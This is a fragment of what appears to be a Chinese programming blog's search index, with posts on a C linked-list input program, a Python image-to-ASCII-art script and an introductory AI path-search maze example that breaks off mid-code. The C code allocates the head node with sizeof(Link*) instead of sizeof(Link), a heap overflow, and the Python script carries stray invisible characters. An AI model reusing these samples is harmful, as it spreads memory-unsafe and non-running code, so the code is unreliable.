<li>r如果字符串中不包含该字符，则返回一个空指针</li></ul><p>经过重写，修改如下：</p><p>首先使用fgets()函数接收输入，并将返回值存储在指针ret_val中，然后对该指针进行判断，如果不为空指针，则使用字符查找函数查找换行符，并将该换行符替换为空字符，如果查找换行符失败，说明输入的字符数量超过了字符数组的大小，这时使用一个while循环接收其余的输入并抛弃；如果ret_val为空指针，说明遇到文件结尾；最后返回ret_val；</p><h2>第三步：编写主函数进行测试</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> input[MAX_INPUT];</span><br><span class="line">Link* p = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link*));</span><br><span class="line">Link* temp = p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now start recording: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (s_gets(input,MAX_INPUT) != <span class="literal">NULL</span> &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">Link* a = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link));</span><br><span class="line">a-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;next = a;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="built_in">strcpy</span>(a-&gt;name, input);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;(a-&gt;number));</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">temp = p-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Recorded Data: \n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (temp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\tNumber: %ld\n&quot;</span>, temp-&gt;name, temp-&gt;number);</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>首先声明一个字符数组用来储存输入，然后声明一个节点类型的指针作为头节点，并为其分配内存，接着再声明一个同样的临时指针指向该头指针，这里使用临时指针的目的是作为当前指针与下一个指针的过渡指针，同时保持头指针指向的内容不变，方便最后的输出；</li>    <li>在输出提示信息之后进入循环，退出条件为输入空行；在循环中，首先声明指向当前节点的指针并为其分配内存，接着将该指针指向的结构中的指针声明为NULL，然后将当前节点的指针赋给临时指针指向的结构的指针，使其与上一个节点相连，然后再将临时指针指向的指针赋给自身(其实就相当于使临时指针指向下一个节点)；接着将刚刚接收的输入复制到当前节点的name变量中，然后再接收编号的输入并存储到当前节点的number变量中；值得注意的是，在使用scanf()函数接收输入后该函数似乎会将换行符留在缓存区中，所以这里需要使用getchar()函数来将该换行符从缓存区中去除；</li>    <li>在循环结束之后，我将临时指针指向了头节点的下一个节点(请注意，头节点中并没有储存除下一个节点的地址之外的任何信息，故此处从头节点的下一个节点开始)；然后进入下一个while循环，退出条件为临时指针为空指针(因为在上一个while循环中已经将当前节点中的指针声明为NULL了，所以一旦第一个循环结束，最后一个节点中的指针必为NULL)，然后打印出当前节点的信息并将临时指针指向下一个节点。</li></ul><h2>源代码</h2><p>最后附上源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_INPUT 20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span>* ret_val;</span><br><span class="line"><span class="keyword">char</span>* find;</span><br><span class="line">ret_val = fgets(st, n, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span> (ret_val) &#123;</span><br><span class="line">find = <span class="built_in">strchr</span>(st, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (find) &#123;</span><br><span class="line">*find = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkList</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> name[MAX_INPUT];</span><br><span class="line"><span class="keyword">long</span> number;</span><br><span class="line">LinkList* next;</span><br><span class="line">&#125;Link;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> input[MAX_INPUT];</span><br><span class="line">Link* p = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link*));</span><br><span class="line">Link* temp = p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now start recording: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (s_gets(input,MAX_INPUT) != <span class="literal">NULL</span> &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">Link* a = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link));</span><br><span class="line">a-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;next = a;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="built_in">strcpy</span>(a-&gt;name, input);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;(a-&gt;number));</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">temp = p-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Recorded Data: \n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (temp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\tNumber: %ld\n&quot;</span>, temp-&gt;name, temp-&gt;number);</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> 知识输出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用Python编写一个能将图片转换为字符画的程序</title>
      <link href="2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
      <url>2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># -*- coding=utf-8 -*- </span></span><br><span class="line"></span><br><span class="line">from PIL import Image </span><br><span class="line"></span><br><span class="line">import argparse <span class="comment">#命令行输入参数处理 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser() </span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;file&#x27;</span>)     <span class="comment">#输入文件</span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>)   <span class="comment">#输出文件 </span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;--width&#x27;</span>, <span class="built_in">type</span> = int, default = 80) <span class="comment">#输出字符画宽 </span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;--height&#x27;</span>, <span class="built_in">type</span> = int, default = 80) <span class="comment">#输出字符画高 #获取参数 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">args = parser.parse_args() </span><br><span class="line"></span><br><span class="line">IMG = args.file</span><br><span class="line"></span><br><span class="line">WIDTH = args.width </span><br><span class="line"></span><br><span class="line">HEIGHT = args.height </span><br><span class="line"></span><br><span class="line">OUTPUT = args.output </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ascii_char = list(<span class="string">&quot;<span class="variable">$@B</span>%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\&quot;^&#x27;. &quot;</span>) <span class="comment"># 将256灰度映射到70个字符上 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_char(r,g,b,alpha = 256):    </span><br><span class="line"></span><br><span class="line">​<span class="keyword">if</span> alpha == 0:        </span><br><span class="line"></span><br><span class="line">​<span class="built_in">return</span> <span class="string">&#x27; &#x27;</span>    </span><br><span class="line"></span><br><span class="line">​length = len(ascii_char)    </span><br><span class="line"></span><br><span class="line">​gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b)     </span><br><span class="line"></span><br><span class="line">​unit = (256.0 + 1)/length    </span><br><span class="line"></span><br><span class="line">​<span class="built_in">return</span> ascii_char[int(gray/unit)] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:     </span><br><span class="line"></span><br><span class="line">​im = Image.open(IMG)    </span><br><span class="line"></span><br><span class="line">​im = im.resize((WIDTH,HEIGHT), Image.NEAREST)     </span><br><span class="line"></span><br><span class="line">​txt = <span class="string">&quot;&quot;</span>     </span><br><span class="line"></span><br><span class="line">​<span class="keyword">for</span> i <span class="keyword">in</span> range(HEIGHT):        </span><br><span class="line"></span><br><span class="line">​<span class="keyword">for</span> j <span class="keyword">in</span> range(WIDTH):            </span><br><span class="line"></span><br><span class="line">​txt += get_char(*im.getpixel((j,i)))        </span><br><span class="line"></span><br><span class="line">​txt += <span class="string">&#x27;\n&#x27;</span>     </span><br><span class="line"></span><br><span class="line">​<span class="built_in">print</span>(txt)     <span class="comment">#字符画输出到文件    </span></span><br><span class="line"></span><br><span class="line">​<span class="keyword">if</span> OUTPUT:        </span><br><span class="line"></span><br><span class="line">​with open(OUTPUT,<span class="string">&#x27;w&#x27;</span>) as f:            </span><br><span class="line"></span><br><span class="line">​f.write(txt)    </span><br><span class="line"></span><br><span class="line">​<span class="keyword">else</span>:        </span><br><span class="line"></span><br><span class="line">​with open(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>) as f:           </span><br><span class="line"></span><br><span class="line">​f.write(txt)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能入门-查找</title>
      <link href="2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/"/>
      <url>2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<h2>概述</h2><p>众所周知，人工智能在近些年十分火爆，在各个领域的应用也是十分广泛，其中一个领域就是导航。<a id="more"></a></p><p>也许有人会说，导航不就是电子地图嘛？和人工智能有什么关系？但其实在导航中人工智能发挥了很重要的作用。“条条大路通罗马”，为什么导航会向你推荐这条路而不推荐另一条路？这其中就涉及到了人工智能中的搜索算法。</p><p><img src="https://www.helloimg.com/images/2021/04/05/B7S4Ln.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/05/B7S4Ln.png" srcset="data:image/png;base64,666" alt="B7S4Ln.png"></p><p>在搜索中，往往有初始状态(initial states)、目标状态(goal states)，而人工智能所做的，就是在众多情形中，找到众多解决方法的最优解，其中会涉及到循环和迭代，假如我们现在有一个初始状态，我们要怎样达到目标状态呢？</p><h2>概念介绍</h2><p>在这之前需要先了解一些概念：</p><ul>    <li>动作：通常是接受状态的函数，返回在此状态中应该做出的决策</li>    <li>迁移模型：通常是接受状态和动作的函数，返回在此状态下做出此种决策后的新状态</li>    <li>节点：数据结构，用来记录状态，父节点，动作和路径成本</li>    <li>边界：数据结构，用来区分已探索的部分和未探索的部分</li></ul><h2>算法讨论</h2><p>在了解了相关概念之后，我们开始讨论算法：</p><ul>    <li>首先将初始状态放入边界，然后进入循环</li>    <ul>        <li>如果边界为空，则无解</li>        <li>从边界中移去一个节点</li>        <li>如果此节点包含目标状态，则追踪父节点，然后返回解决方案</li>        <li>扩张节点并将其加入边界</li>    </ul></ul><p>下面举个例子：</p><img src="https://www.helloimg.com/images/2021/04/05/B7StR6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/05/B7StR6.png" srcset="data:image/png;base64,666" alt="B7StR6.png" style="zoom: 33%;" /><p>假设我们现在的要求是找到从A到E的路径</p><ul>    <li>第一步我们将A（初始状态）放入边界，进入循环</li>    <li>因为A不是目标状态，将A移出边界并将B加入边界</li>    <li>因为B不是目标状态，将B移出边界并将C和D加入边界</li>    <li>因为C不是目标状态，将C移出边界并将E加入边界</li>    <li>因为E是目标状态，所以我们返回从A到E的路径，循环结束</li></ul>至此，我们就解决了一个非常简单的路径搜索问题，当然，这个算法还存在着许多问题，比如：如何确保算法不会重新检查当前状态的父节点？如果重复检查父节点，那么程序将进入无限死循环。解决方法很简单，使用一个数据结构来储存已检查过的节点，然后在每次检查节点时遍历此数据结构，如果存在与之相同的节点则不检查。<p>那么在实际情况下是怎么样的呢？</p><h2>实战</h2><p>下面进入实战环节：</p><p>情境：你现在有一张迷宫地图，起点为A，终点为B，需要编写程序令计算机自行找出离开迷宫的路并显示在屏幕上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A           <span class="comment"># # # # </span></span><br></pre></td></tr></table></figure><p>我们将这个待实现的程序按照之前所讨论的分为几个部分：</p><p><a href="https://www.helloimg.com/image/BITMNm"><img src="https://www.helloimg.com/images/2021/04/11/BITMNm.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/11/BITMNm.png" srcset="data:image/png;base64,666" alt="BITMNm.png"></a></p><p>如图所示，我们主要将程序分为三个部分：</p><p>首先是定义相关的变量，并且将初始状态放入边界；</p><p>然后进入循环：</p><ul>    <li>第一步：检查边界的长度，如果等于0则说明无解</li>    <li>第二步：从边界中移去一个节点，并将此节点添加到表示已探索的数据结构</li>    <li>第三步：检查被移去的节点，如果此节点包含目标状态，则追踪其父节点，并返回路径</li></ul><p>最后，我们使用一个循环来追踪完整的路径，并将其显示在屏幕上。</p><p>以下是根据思路实现的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">map1  = [[<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>],</span><br><span class="line">         [<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;#&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the route</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">0</span>]=<span class="string">&#x27;A&#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">9</span>]=<span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[<span class="number">5</span>][i] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    map1[i][<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">1</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">2</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">3</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">9</span>][<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">6</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line">map1[<span class="number">0</span>][<span class="number">8</span>] = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print out the map</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        print(j,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> 